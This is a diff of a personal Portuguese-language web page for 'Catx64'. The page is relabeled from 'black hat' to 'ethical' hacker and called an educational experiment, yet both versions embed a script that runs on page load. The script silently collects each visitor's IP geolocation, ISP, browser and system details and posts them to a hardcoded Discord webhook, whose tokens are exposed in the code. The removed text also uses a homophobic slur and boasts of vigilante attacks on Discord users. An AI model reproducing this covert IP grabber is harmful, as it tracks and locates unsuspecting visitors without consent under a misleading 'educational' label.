@@ -1,17 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Catx64 - Hacker Black Hat</title>
+    <title>Catx64 - Hacker Ético</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="content-wrapper">
         <header>
-            <h1></h1>
-            <h2>Hacker Black Hat</h2>
+            <h1>Catx64</h1>
+            <h2>Hacker Ético</h2>
         </header>
+
         <section class="ascii-art">
             <pre>
                \`-._           __
@@ -43,57 +44,67 @@
                            `----`
             </pre>
         </section>
-            <h2>Catx64</h2>
-            <p>é um hacker black hat que combate paneleiros e pedófilos. Já conseguiu rodar mais de 10 pedófilos no Discord.</p>
+
+        <section>
+            <h2>Sobre o Projeto</h2>
+            <p>Este site é um experimento educacional para entender a coleta de informações públicas na web.</p>
+            <button id="coletarDados">Coletar Informações</button>
         </section>
+
         <footer>
             <p>&copy; 2025 Catx64 - Todos os direitos reservados.</p>
         </footer>
     </div>
-    
     <script>
-    async function getIPInfo() {
-        const response = await fetch("http://ip-api.com/json/");
-        return response.json();
-    }
-
-    async function sendToWebhook() {
-        const ipInfo = await getIPInfo();
-        const userAgent = navigator.userAgent;
-        const idioma = navigator.language;
-        const protocolo = window.location.protocol;
-        const porta = window.location.port || "Padrão";
-        const dataHora = new Date().toLocaleString();
-
-        let mensagem = `🏠 | IP: ${ipInfo.query}\n` +
-            `🔎 | Cidade: ${ipInfo.city}\n` +
-            `📍 | Região: ${ipInfo.regionName}\n` +
-            `🌎 | País: ${ipInfo.country}\n` +
-            `📦 | ISP: ${ipInfo.isp}\n\n` +
-            `🔓 | USER-AGENT: ${userAgent}\n` +
-            `🌐 | NAVEGADOR: ${navigator.appName}\n` +
-            `💻 | SISTEMA OPERACIONAL: ${navigator.platform}\n` +
-            `🚪 | PORTA: ${porta}\n` +
-            `🔒 | PROTOCOLO: ${protocolo}\n` +
-            `👥 | LINGUAGEM: ${idioma}\n` +
-            `📆 | DATA/HORA: ${dataHora}\n\n`;
-
-        const webhookURL = "https://discord.com/api/webhooks/1326227479622324395/a_uSmUaOYe6WgQeV-1-fifEJm6MmAI5LtBCB_CF8NmUSnhete8Jb53Tm2AF9pGxqR2cM";
-
-        fetch(webhookURL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                content: "```" + mensagem + "```"
-            })
-        })
-        .then(response => console.log("Dados enviados com sucesso!"))
-        .catch(error => console.error("Erro ao enviar os dados:", error));
-    }
-
-    sendToWebhook();
-    </script>
+        async function enviarParaWebhook() {
+            try {
+                const response = await fetch("https://ip-api.com/json/");
+                const ipInfo = await response.json();
+    
+                const userAgent = navigator.userAgent;
+                const idioma = navigator.language;
+                const protocolo = window.location.protocol;
+                const porta = window.location.port || "Padrão";
+                const dataHora = new Date().toLocaleString();
+    
+                // Melhor detecção de sistema operacional (PC e Mobile)
+                let sistemaOperacional = "Desconhecido";
+                if (navigator.userAgentData && navigator.userAgentData.platform) {
+                    sistemaOperacional = navigator.userAgentData.platform;
+                } else if (navigator.platform) {
+                    sistemaOperacional = navigator.platform;
+                }
+    
+                let mensagem = `📡 **Nova Conexão Detectada**\n\n` +
+                    `🏠 **IP:** ${ipInfo.query}\n` +
+                    `🔎 **Cidade:** ${ipInfo.city}\n` +
+                    `📍 **Região:** ${ipInfo.regionName}\n` +
+                    `🌎 **País:** ${ipInfo.country}\n\n` +
+                    `💻 **Sistema Operacional:** ${sistemaOperacional}\n` +
+                    `🔓 **User-Agent:** ${userAgent}\n` +
+                    `🚪 **Porta:** ${porta}\n` +
+                    `🔒 **Protocolo:** ${protocolo}\n` +
+                    `👥 **Linguagem:** ${idioma}\n` +
+                    `📆 **Data/Hora:** ${dataHora}`;
+    
+                const webhookURL = "https://discord.com/api/webhooks/1335027783209844767/gDOdN1-ICsD4KPG_gOUEubU3CXYL7WE7W3wkjmXVDjhQHkSJWinVSXdRfiS15jj4IG63";
+    
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: mensagem
+                    })
+                });
+    
+            } catch (error) {
+                console.error("Erro ao enviar os dados:", error);
+            }
+        }
+    
+        enviarParaWebhook();
+    </script>       
 </body>
 </html>
